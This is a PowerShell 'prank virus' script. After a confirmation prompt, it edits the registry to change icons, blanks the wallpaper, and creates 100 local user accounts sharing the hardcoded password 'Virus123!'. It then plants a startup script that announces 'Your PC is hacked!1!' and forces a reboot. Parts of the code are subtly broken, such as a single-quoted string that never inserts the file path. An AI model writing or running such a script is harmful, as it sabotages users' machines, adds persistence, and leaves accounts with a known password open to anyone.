Add-Type -TypeDefinition @"
using System.Windows.Forms;
public class WarningBox {
    public static DialogResult Show() {
        return MessageBox.Show("Warning: A virus has been detected!\nDo you want to launch it?", "Virus Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
    }
}
"@ -Language CSharp

$choice = [WarningBox]::Show()

if ($choice -eq "No") {
    Write-Host "Virus execution canceled." -ForegroundColor Green
    exit
}

Write-Host "This is virus" -ForegroundColor Red
Start-Sleep -Seconds 3

# Change shortcut and folder icons randomly
$iconPaths = @(
    "C:\Windows\System32\shell32.dll,4",
    "C:\Windows\System32\imageres.dll,7",
    "C:\Windows\System32\shell32.dll,20",
    "C:\Windows\System32\imageres.dll,34"
)

$registryKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.lnk\UserChoice", # Shortcuts
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.folder\UserChoice" # Folders
)

foreach ($key in $registryKeys) {
    if (Test-Path $key) {
        Set-ItemProperty -Path $key -Name "DefaultIcon" -Value ($iconPaths | Get-Random)
    }
}

# Change desktop background to black
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value ""
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

# Create 100 fake accounts
for ($i=1; $i -le 100; $i++) {
    $username = "HackedUser$i"
    New-LocalUser -Name $username -Password (ConvertTo-SecureString "Virus123!" -AsPlainText -Force) -AccountNeverExpires -PasswordNeverExpires -UserMayChangePassword $false
    Add-LocalGroupMember -Group "Users" -Member $username
}

# Create a startup script that shows "Your PC is hacked!1!" and removes the main virus
$startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hacked.ps1"
$virusScriptPath = $MyInvocation.MyCommand.Path

$scriptContent = @'
Write-Host "Your PC is hacked!1!" -ForegroundColor Green
Start-Sleep -Seconds 5
Remove-Item -Path "' + $virusScriptPath + '" -Force
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
'@

$scriptContent | Out-File -FilePath $startupScript -Encoding UTF8

# Restart the computer to apply all chaos
Start-Sleep -Seconds 2
Restart-Computer -Force
